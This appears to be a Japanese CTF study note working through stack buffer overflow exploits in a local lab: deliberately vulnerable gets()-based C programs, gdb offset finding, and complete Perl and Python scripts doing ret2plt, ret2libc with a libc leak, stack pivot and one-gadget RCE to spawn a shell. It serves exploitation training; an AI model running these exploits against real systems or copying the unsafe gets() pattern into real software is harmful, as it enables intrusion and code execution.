## ret2plt

```
$ cat bof.c
// gcc -m32 -fno-stack-protector -no-pie -o bof bof.c
#include <stdio.h>
#include <stdlib.h>

static void vuln() {
        char buf[100];
        gets(buf);
        printf("Hello! %s\n", buf);
        fflush(stdout);
}

int main() {
        system("date 2>/dev/null");
        puts("Can you tell me your name?");
        fflush(stdout);
        vuln();
        return 0;
}
//__END__

ビルド
$ gcc -m32 -fno-stack-protector -no-pie -o bof bof.c

初動調査
$ pwn.sh bof
bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=8842ae1d58266e3d32dad14c9ac889e022adb38f, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found★   NX enabled★    No PIE          No RPATH   No RUNPATH   73 Symbols     No       0               4       bof

サーバ起動
$ socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./bof

ASLR無効化
# sysctl kernel.randomize_va_space=0

バッファの先頭からリターンアドレスまでのオフセット確認
$ gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
gdb-peda$ pattc 120
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
gdb-peda$ set follow-fork-mode parent
gdb-peda$ r
Starting program: /home/guru/work/ret2libc/bof
Sat Jun 15 01:30:37 UTC 2019
Can you tell me your name?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
Hello! AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
Invalid $PC address: 0x41384141
Stopped reason: SIGSEGV
0x41384141 in ?? ()
gdb-peda$ patto 0x41384141
1094205761 found at offset: 112

system@pltのアドレス確認
$ grep system@plt bof.disas
080483d0 <system@plt>:★

/bin/shのアドレス確認
gdb-peda$ searchmem /bin/sh
Searching for '/bin/sh' in: None ranges
Found 4 results, display max 4 items:
   libc : 0xf7f705db ("/bin/sh")★

攻撃コード投入+シェル起動
$ (perl -e 'print "A" x 112 . "\xd0\x83\x04\x08"."AAAA"."\xdb\x05\xf7\xf7"."\n"'; cat - ) | nc localhost 5000
Sat Jun 15 01:39:05 UTC 2019
Can you tell me your name?
Hello! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??
id
uid=1000(guru) gid=1000(guru) groups=1000(guru),27(sudo)
cat flag
FLAG_GGGGGGGGGGGGGGGGG

```

## ret2libc, stack pivot, One Gadget RCE

```
ASLR有効化
sysctl kernel.randomize_va_space=2

$ cat bof64.c
// gcc -fno-stack-protector -o bof64 bof64.c
#include <stdio.h>
#include <stdlib.h>

static void vuln() {
        char buf[100];
        gets(buf); // gets(3)なので0x00 が入力に混じってもOK。改行まで読み込んでくれる。　fgets(3)の場合は0x00不可=>stack pivotは無理なので、_startなどを使う
        printf("Hello! %s\n", buf);
}

int main() {
        setvbuf(stdout, 0, _IONBF, 0);
        puts("Can you tell me your name?");
        vuln();
        return 0;
}

ビルド
$ gcc -fno-stack-protector -no-pie -o bof64 bof64.c

サーバ起動
$ socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./bof64

初動調査
$ pwn.sh bof64
bof64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=62b1f290120b1049c3659f957a03405556beb9c8, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found★   NX enabled★    No PIE          No RPATH   No RUNPATH   70 Symbols     No       0               4       bof64

.plt確認
$ grep @plt bof64.disas
  4004d8:       e8 53 00 00 00          call   400530 <__gmon_start__@plt>
00000000004004f0 <puts@plt-0x10>:
0000000000400500 <puts@plt>:　★アドレスのリーク時に使える
0000000000400510 <printf@plt>:　★アドレスのリーク時に使える
0000000000400520 <__libc_start_main@plt>:
0000000000400530 <__gmon_start__@plt>:
0000000000400540 <gets@plt>:　★攻撃コードの埋め込み時に使える
0000000000400550 <setvbuf@plt>:

ret2pltではsystem("/bin/sh")はよべない
ASLR有効なのでlibc_baseも分からない

GOTのアドレス確認
$ gdb -q bof64 -ex 'set follow-fork-mode parent' -ex start -ex vmmap -ex q
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/guru/work/ret2libc/bof
0x00600000         0x00601000         r--p      /home/guru/work/ret2libc/bof
0x00601000         0x00602000         rw-p      /home/guru/work/ret2libc/bof ★GOT

バッファの先頭からリターンアドレスまでのオフセット確認
$ gdb -q bof64 -ex 'pattc 200' -ex q
Reading symbols from bof64...(no debugging symbols found)...done.
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
$ gdb -q bof64 -ex r
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
=> 0x400681 <vuln+43>:  ret
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe528 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
gdb-peda$ patto jAA9
jAA9 found at offset: 120★

必要に応じて微調整
# gdb -q -p `pidof -s bof64` -ex 'b *0x400681'

exploit実行
$ perl exploit.pl
Can you tell me your name?
Hello! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@
50f9a2f7ff7f[+] libc_base = 0x00007ffff7a0f000
id
uid=1000(guru) gid=1000(guru) groups=1000(guru),27(sudo)
cat flag
FLAG_GGGGGGGGGGGGGGGGG
exit

$ cat exploit.pl
use pwntools;
use Time::HiRes qw (usleep);

$pwntools::ARCH = '64';

$leaveret = 0x400680;
$pop_rbp = 0x4005c0;
$pop_rdi = 0x400723;
$lsm_got = 0x601028;
$puts_plt = 0x400500;
$gets_plt = 0x400540;
$start_addr = 0x400560;

$system_offset=0x443d0;
$lsm_offset=0x20950;
$binsh_offset=0x18c3dd;
$rce_offset=0x442aa;  # One Gadget RCEのアドレス libc内に10箇所くらい存在する
$rce_offset=0xf0840;  # https://github.com/david942j/one_gadget  を使って抽出しているが、stackとレジスタの値によってはshellが起動せず落ちる。objdumpでも抽出可能
$rce_offset=0xf170d;  # 例: objdump -d -Mintel /lib/x86_64-linux-gnu/libc.so.6 | grep -B 10 -A 5 execve | less

# Main
&connect(\$s, 'localhost', 5000) or die "ng";
print &read_until($s, qr/\n/);

# 1st stage : leak libc_base + stack pivot
$buf = "A" x 120 . p($pop_rdi).p($lsm_got).p($puts_plt); # puts(lsm@GOT)
$buf.= p($pop_rdi).p(0x601c00).p($gets_plt); # gets(0x601c00=GOT) ★stack pivotする際、スタック溢れ注意。libc内の関数を呼び出すと0x400くらいstackに積まれる可能性有
$buf.= p($pop_rbp).p(0x601c00-8).p($leaveret)."\n"; # stack pivot
syswrite($s, $buf, length($buf));

# 1st stage : leak libc_base + restart
#$buf = "A" x 120 . p($pop_rdi).p($lsm_got).p($puts_plt); # puts(lsm@GOT)
#$buf.= p($start_addr)."\n"; # <_start> addr
#$a = <STDIN>;
#syswrite($s, $buf, length($buf));

&read_until($s, qr/\n/, 300);
$data = &read_until($s, qr/\n/, 300);
chomp($data);
print unpack("H*", $data);
$libc_base = u(substr($data,0,6)."\x00\x00")-$lsm_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);

# 2nd stage (after stack pivot)
$buf = p($pop_rdi).p($libc_base+$binsh_offset).p($libc_base+$system_offset)."\n"; # system("/bin/sh")
#$buf = p($libc_base+$rce_offset)."\n";      # One-Gadget-RCE
syswrite($s, $buf, length($buf));

# 2nd stage (after invoking main)
#&read_until($s, qr/\n/, 300);
#$buf = "A" x 120 . p($pop_rdi).p($libc_base+$binsh_offset).p($libc_base+$system_offset)."\n";
#syswrite($s, $buf, length($buf));
#sysread($s, $data, 0x200);

&interact($s);
__END__

One Gadget RCE（コメントアウト部分）を使っても同様に解ける
returnアドレスを_startのアドレスに置換してstack pivotを使わず解く方法もある

python版(stackpivot, one-gadget-RCE)
===実行結果===
$ python3 exploit.py
[+] Starting program './bof64': Done
[*] libc_base: 0x7f22ea342000
[*] Switching to interactive mode

$ ls
bof64  bof64.c    exploit.py  flag
$ cat flag
flag{hogeee}
===実行結果ここまで===

===ソース===
$ cat exploit.py
from pwn import *

r = process("./bof64")

leave_ret = 0x00400680
pop_rbp = 0x004005c0
pop_rdi = 0x00400723
puts_plt = 0x400500
gets_plt = 0x400540
printf_got = 0x601020
writable_addr = 0x601100 # used as stack by stack pivot.
ret_offset = 0x78 # offset from buf to return address
printf_offset = 0x54ba0 # used for calculating libc base.
#system_offset = 0x443d0 # used for runing system("/bin/sh").
#binsh_offset = 0x0018c3dd # used for running system("/bin/sh").
one_gadget_offset = 0x442aa # one gadget RCE

# start exploit.
r.recvuntil("Can you tell me your name?\n")
# 1st stage: leak libc_base & do stack pivot.
payload = b"A" * ret_offset
payload += p64(pop_rdi) + p64(printf_got) + p64(puts_plt) # puts(printf@GOT) for leaking libc.
payload += p64(pop_rdi) + p64(writable_addr) + p64(gets_plt) # gets(writable_addr) for stack_pivot.
payload += p64(pop_rbp) + p64(writable_addr-8) + p64(leave_ret) # do stack pivot.
r.sendline(payload)
r.recvline() # read gomi
printf_libc_addr = u64(r.recv(6)+b'\x00\x00')
libc_base = printf_libc_addr - printf_offset
log.info("libc_base: " + hex(libc_base))

# 2st stage: run /bin/sh.
#libc_system = libc_base + system_offset
#binsh = libc_base + binsh_offset
#payload = p64(pop_rdi) + p64(binsh) + p64(libc_system)
one_gadget = libc_base + one_gadget_offset
payload = p64(one_gadget) # this is written in writable_addr and program returns one_gadget by stack pivot.
r.sendline(payload)
r.interactive()
===ソースここまで===
```

## 過去事例

* CSAW - SCV 100 x86-64 カナリア値リーク、restart、ret2libc 難度低★
* ASIS CTF Finals 2017 - Mrs. Hudson 500 x86-64、ret2libc、要libc特定 難度低★
* BackdoorCTF 2017 - JUST-DO-IT 250 x86、ret2libc 難度低★
* RCTF 2015 Quals - welpwn 200 x86-64、__libc_csu_init()利用 難度中★

一度覚えると簡単にとけるためwarmup 問題として、2019年現在の世界大会でもよく見かける。

